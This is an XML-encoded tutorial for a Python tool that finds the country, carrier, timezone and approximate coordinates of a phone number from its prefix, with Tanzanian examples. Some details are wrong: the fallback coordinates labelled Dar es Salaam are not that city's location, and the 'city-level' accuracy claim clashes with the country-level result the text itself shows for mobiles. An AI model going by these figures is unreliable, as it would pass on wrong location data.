      <text:p text:style-name="Preformatted_20_Text">Technology<text:tab/>How It Works<text:tab/>Accuracy<text:tab/>Requirements<text:tab/>Limitations</text:p>
      <text:p text:style-name="Preformatted_20_Text">Prefix-based geocoding (J Phone NoTracker)<text:tab/>Maps number prefixes to pre-compiled location databases<text:tab/>City-level<text:tab/>Offline-capable, lightweight<text:tab/>Cannot track moved numbers (number portability)</text:p>
      <text:p text:style-name="Preformatted_20_Text">GPS-based tracking<text:tab/>Uses satellite signals<text:tab/>Meter-level<text:tab/>Device hardware, user permission<text:tab/>Requires app installation and user consent</text:p>
      <text:p text:style-name="Preformatted_20_Text">Cell tower triangulation<text:tab/>Measures signal timing from multiple towers<text:tab/>50m-5km<text:tab/>Carrier network access<text:tab/>Only carriers and law enforcement can access</text:p>
      <text:p text:style-name="Preformatted_20_Text">Wi-Fi positioning<text:tab/>Maps nearby Wi-Fi BSSIDs to known locations<text:tab/>20-200m<text:tab/>Wi-Fi scanning enabled<text:tab/>Urban bias, requires database</text:p>
      <text:p text:style-name="Preformatted_20_Text">IP geolocation<text:tab/>Maps IP addresses to physical locations<text:tab/>City to regional<text:tab/>Internet connection<text:tab/>Inaccurate for mobile devices on cellular</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">The key insight is that prefix-based geocoding provides offline, privacy-respecting approximate location without requiring user consent or special permissions—it works purely from publicly available numbering plan data.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">2. Architecture Breakdown</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">2.1 </text:span>High-Level Architecture</text:p>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── Presentation Layer (Tkinter GUI)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Input Form</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Results Display</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── Interactive Controls</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── Phone Number Processing Layer</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Parser (phonenumbers library)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Validator</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── Formatter</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── Data Enrichment Layer</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Geographic Data (geopy/Nominatim)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Carrier Data (phonenumbers carrier module)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── Timezone Data (timezonefinder + pytz)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── Fallback Databases (hardcoded city centers)</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">└── Output Layer</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>├── Text Display</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>├── Map Generation (optional future extension)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>└── Logging/History</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">2.2 Core Components and Interactions</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">2.2.1</text:span> <text:span text:style-name="T4">Phone Number Parser (phonenumbers)</text:span></text:p>
      <text:p text:style-name="Preformatted_20_Text">The foundation of the system is Google's libphonenumber (wrapped in Python's phonenumbers library). This library contains the complete international numbering plan database, regularly updated from official ITU-T recommendations and national regulatory authorities .</text:p>
      <text:p text:style-name="Preformatted_20_Text">import phonenumbers</text:p>
      <text:p text:style-name="Preformatted_20_Text">from phonenumbers import carrier, geocoder, timezone</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"># Parse the number - this validates format and extracts components</text:p>
      <text:p text:style-name="Preformatted_20_Text">number = phonenumbers.parse("+255712345678", None)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>The parser performs:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Country code extraction: Identifies Tanzania (+255)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• National number validation: Ensures correct length (9 digits for Tanzania)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Number type classification: Mobile, fixed-line, toll-free, etc.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">2.2.2 Geographic Data Sources</text:p>
      <text:p text:style-name="Preformatted_20_Text">J Phone NoTracker uses a hybrid approach for geolocation:</text:p>
      <text:p text:style-name="Preformatted_20_Text">Primary Source: OpenStreetMap Nominatim (via geopy)</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P27">from geopy.geocoders import Nominatim</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">geolocator = Nominatim(user_agent="j_phone_notracker")</text:p>
      <text:p text:style-name="P27">location = geolocator.geocode("Dar es Salaam, Tanzania")</text:p>
      <text:p text:style-name="P27">This provides actual latitude/longitude coordinates by geocoding the location name obtained from the phonenumbers geocoder.</text:p>
      <text:p text:style-name="P27">Secondary Source: Hardcoded City Centers For reliability, the application includes a fallback database of major city coordinates :</text:p>
      <text:p text:style-name="P27">def get_country_center(country):</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>centers = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Tanzania": (-6.3690, 34.8888, "Dodoma"), <text:s/># Capital</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Dar es Salaam": (-6.1630, 35.7384, "Dar es Salaam"),</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"Zanzibar City": (-6.1659, 39.2026, "Zanzibar City"),</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># ... other cities</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4">2.2.3 Carrier Detection</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text">The carrier information comes from the phonenumbers.carrier module, which maps number prefixes to operator names :</text:p>
      <text:p text:style-name="Preformatted_20_Text">Prefix → Operator Mapping for Tanzania:</text:p>
      <text:p text:style-name="Preformatted_20_Text">74,75,76 → Vodacom</text:p>
      <text:p text:style-name="Preformatted_20_Text">68,69,78 → Airtel</text:p>
      <text:p text:style-name="Preformatted_20_Text">65,67,71,77 → tiGO</text:p>
      <text:p text:style-name="Preformatted_20_Text">61,62 → halotel</text:p>
      <text:p text:style-name="Preformatted_20_Text">73 → TTCL</text:p>
      <text:p text:style-name="Preformatted_20_Text">This mapping is based on the official allocations from the Tanzania Communications Regulatory Authority (TCRA) .</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">2.2.4 Timezone Handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">The application determines the correct timezone using a two-step process:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Country-level timezone: For Tanzania, the IANA timezone is "Africa/Dar_es_Salaam" (UTC+3 year-round, no DST)</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. City-level adjustment: Using timezonefinder, the application can refine to city-specific timezones where applicable</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">from timezonefinder import TimezoneFinder</text:p>
      <text:p text:style-name="P27">import pytz</text:p>
      <text:p text:style-name="P27">from datetime import datetime</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">tf = TimezoneFinder()</text:p>
      <text:p text:style-name="P27">timezone_str = tf.timezone_at(lat=latitude, lng=longitude)</text:p>
      <text:p text:style-name="P27">if timezone_str:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tz = pytz.timezone(timezone_str)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>local_time = datetime.now(tz)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="Preformatted_20_Text">2.3 Data Flow</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ User Input <text:s/>│ <text:s/>"+255712345678"</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Validate <text:s text:c="2"/>│ <text:s/>phonenumbers.parse()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>&amp; Parse <text:s text:c="3"/>│ <text:s/>→ Valid? Yes → Country: Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘ <text:s text:c="3"/>→ Type: Mobile</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓ <text:s text:c="10"/>→ National: 712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Geocode <text:s text:c="3"/>│ <text:s/>phonenumbers.geocoder.description_for_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Location <text:s text:c="2"/>│ <text:s/>→ "Tanzania" (country level)</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘ <text:s text:c="2"/>→ For fixed lines: city/region</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Get Carrier │ <text:s/>phonenumbers.carrier.name_for_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="13"/>│ <text:s/>→ Prefix 71 → "tiGO"</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Get Timezone│ timezone.time_zones_for_number()</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="13"/>│ <text:s/>→ "Africa/Dar_es_Salaam"</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Get Coordinates │ geopy.geocode("Dar es Salaam")</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="18"/>→ (-6.1630, 35.7384)</text:p>
      <text:p text:style-name="Preformatted_20_Text">└──────┬──────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="7"/>↓</text:p>
      <text:p text:style-name="Preformatted_20_Text">┌─────────────┐</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Display <text:s text:c="3"/>│ GUI shows all enriched data</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s/>Results <text:s text:c="3"/>│</text:p>
      <text:p text:style-name="Preformatted_20_Text">└─────────────┘</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P4">3. Step-by-Step Implementation</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 1:</text:span> Environment Setup</text:p>
      <text:p text:style-name="Preformatted_20_Text">We'll create a professional development environment with isolation and reproducibility.</text:p>
      <text:p text:style-name="P27"># Create project directory</text:p>
      <text:p text:style-name="P27">mkdir j-phone-notracker &amp;&amp; cd j-phone-notracker</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Initialize git repository</text:p>
      <text:p text:style-name="P27">git init</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Create virtual environment</text:p>
      <text:p text:style-name="P27">python -m venv venv</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Activate virtual environment</text:p>
      <text:p text:style-name="P27"># On Windows:</text:p>
      <text:p text:style-name="P27">venv\Scripts\activate</text:p>
      <text:p text:style-name="P27"># On macOS/Linux:</text:p>
      <text:p text:style-name="P27">source venv/bin/activate</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Verify Python version (3.6+ required)</text:p>
      <text:p text:style-name="P27">python –version</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:span text:style-name="T2">Step 2:</text:span> Dependency Installation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Create a requirements.txt with exact versions for reproducibility:</text:p>
      <text:p text:style-name="P27">phonenumbers==8.13.27</text:p>
      <text:p text:style-name="P27">geopy==2.4.0</text:p>
      <text:p text:style-name="P27">timezonefinder==6.2.0</text:p>
      <text:p text:style-name="P27">pytz==2024.1</text:p>
      <text:p text:style-name="P27">requests==2.31.0</text:p>
      <text:p text:style-name="P27">Pillow==10.1.0 <text:s/># For GUI image handling</text:p>
      <text:p text:style-name="P27">Install dependencies:</text:p>
      <text:p text:style-name="P27">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="P2">Why these specific versions?</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• phonenumbers 8.13.27 includes the latest Tanzanian numbering plan updates</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• geopy 2.4.0 has improved Nominatim rate limiting</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• timezonefinder 6.2.0 includes Africa timezone boundaries</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 3:</text:span> Project Structure</text:p>
      <text:p text:style-name="Preformatted_20_Text">Create a professional project structure following Python best practices:</text:p>
      <text:p text:style-name="Preformatted_20_Text">j-phone-notracker/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── src/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── main.py <text:s text:c="16"/># Entry point</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── gui/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── window.py <text:s text:c="11"/># Tkinter main window</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>└── components.py <text:s text:c="7"/># Reusable UI components</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── core/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── tracker.py <text:s text:c="10"/># Core tracking logic</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── geocoder.py <text:s text:c="9"/># Geographic lookup</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── carrier.py <text:s text:c="10"/># Carrier detection</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>└── timezone_utils.py <text:s text:c="3"/># Timezone handling</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── data/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>├── city_centers.py <text:s text:c="5"/># Fallback coordinates</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>│ <text:s text:c="2"/>└── country_codes.py <text:s text:c="4"/># ISO country data</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── utils/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>├── logger.py <text:s text:c="11"/># Logging configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>└── validators.py <text:s text:c="7"/># Input validation</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── tests/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── __init__.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── test_tracker.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── test_geocoder.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── test_data/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="6"/>└── sample_numbers.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── data/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── history/ <text:s text:c="17"/># Lookup history storage</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── cache/ <text:s text:c="20"/># Geocoding cache</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── logs/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── app.log <text:s text:c="19"/># Application logs</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── config/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── settings.yaml <text:s text:c="13"/># Configuration file</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── logging.conf <text:s text:c="15"/># Logging configuration</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/>├── scripts/</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>├── update_phone_data.py <text:s text:c="7"/># Update phonenumbers metadata</text:p>
      <text:p text:style-name="Preformatted_20_Text">│ <text:s text:c="2"/>└── seed_city_data.py <text:s text:c="11"/># Populate fallback database</text:p>
      <text:p text:style-name="Preformatted_20_Text">│</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── requirements-dev.txt <text:s text:c="11"/># Development dependencies</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── setup.py <text:s text:c="23"/># Package installation</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── README.md</text:p>
      <text:p text:style-name="Preformatted_20_Text">├── LICENSE</text:p>
      <text:p text:style-name="Preformatted_20_Text">└── .gitignore</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"><text:span text:style-name="T2">Step 4:</text:span> Core Implementation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Let's implement the core tracking logic with production-grade error handling and logging.</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">File: src/core/tracker.py</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27">Core phone number tracking implementation.</text:p>
      <text:p text:style-name="P27">Uses Google's libphonenumber for offline prefix-based geocoding.</text:p>
      <text:p text:style-name="P27">"""</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">import logging</text:p>
      <text:p text:style-name="P27">import phonenumbers</text:p>
      <text:p text:style-name="P27">from phonenumbers import carrier, geocoder, timezone</text:p>
      <text:p text:style-name="P27">from typing import Dict, Optional, Tuple, List</text:p>
      <text:p text:style-name="P27">from dataclasses import dataclass, asdict</text:p>
      <text:p text:style-name="P27">from datetime import datetime</text:p>
      <text:p text:style-name="P27">import pytz</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">from src.data.city_centers import CITY_CENTERS</text:p>
      <text:p text:style-name="P27">from src.core.geocoder import get_coordinates_from_location</text:p>
      <text:p text:style-name="P27">from src.utils.validators import validate_phone_number</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Configure module logger</text:p>
      <text:p text:style-name="P27">logger = logging.getLogger(__name__)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">@dataclass</text:p>
      <text:p text:style-name="P27">class PhoneNumberInfo:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Data class for phone number information."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>raw_number: str</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>valid: bool</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>country_code: Optional[int] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>national_number: Optional[int] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>country_name: Optional[str] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>location: Optional[str] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>carrier_name: Optional[str] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>timezones: Optional[List[str]] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>latitude: Optional[float] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>longitude: Optional[float] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>number_type: Optional[str] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>local_time: Optional[str] = None</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>lookup_timestamp: Optional[str] = None</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:s text:c="4"/>def to_dict(self) -&gt; dict:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Convert to dictionary for serialization."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return asdict(self)</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"><text:soft-page-break/>class PhoneNumberTracker:</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Main tracker class for phone number geolocation.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>Uses offline prefix databases with online geocoding fallback.</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Number type mapping</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>NUMBER_TYPES = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>0: "Fixed Line",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>1: "Mobile",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>2: "Fixed Line or Mobile",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>3: "Toll Free",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>4: "Premium Rate",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>5: "Shared Cost",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>6: "VoIP",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>7: "Personal Number",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>8: "Pager",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>9: "Universal Access Number",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>10: "Voicemail",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>11: "Unknown"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def __init__(self, use_online_geocoding: bool = True, cache_results: bool = True):</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Initialize the tracker.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>use_online_geocoding: Whether to use online Nominatim for coordinates</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>cache_results: Whether to cache geocoding results</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.use_online_geocoding = use_online_geocoding</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.cache_results = cache_results</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>self.geocode_cache = {}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>logger.info(f"PhoneNumberTracker initialized (online={use_online_geocoding})")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def track(self, phone_number: str) -&gt; PhoneNumberInfo:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Track a phone number and return comprehensive information.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>phone_number: Phone number in international format (e.g., +255712345678)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>PhoneNumberInfo object with all available data</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>logger.info(f"Tracking phone number: {phone_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Initialize result object</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>result = PhoneNumberInfo(</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>raw_number=phone_number,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>valid=False,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>lookup_timestamp=datetime.now().isoformat()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Step 1: Validate and parse</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="12"/>if not validate_phone_number(phone_number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>logger.warning(f"Invalid phone number format: {phone_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>return result</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>parsed = phonenumbers.parse(phone_number, None)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Check if number is valid</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if not phonenumbers.is_valid_number(parsed):</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>logger.warning(f"Invalid phone number (failed validation): {phone_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>return result</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.valid = True</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.country_code = parsed.country_code</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result.national_number = parsed.national_number</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Step 2: Get basic location (country/city)</text:p>
